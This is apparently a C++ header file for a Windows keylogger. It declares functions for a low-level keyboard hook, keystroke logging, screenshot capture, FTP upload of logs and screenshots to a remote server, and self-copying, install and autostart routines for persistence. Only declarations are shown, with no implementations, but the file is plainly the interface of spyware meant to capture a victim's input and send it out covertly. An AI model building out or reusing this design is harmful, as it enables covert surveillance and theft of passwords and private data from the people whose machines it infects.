#pragma once

#include <stdio.h>
#include <string>
#include <windows.h>
#include <wininet.h>
#include <winuser.h>
#include <conio.h>
#include <time.h>
#include <fstream>
#include <strsafe.h>
#include <io.h>
#include <crtdefs.h>
#include <fstream>



namespace kl {
	void userpath();
	void screenshot(std::string file);
	void ftp_scrshot_send();
	void ftplogsend();
	void AutoCopy();
	void Install();
	int isCapsLock();
	LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
	DWORD WINAPI KeyLogger(LPVOID lpParameter);
	int StartKeyLogging();
	void AutoStart();
	int klgstart();

	extern std::fstream log_error_file;
	extern std::string userlc;
}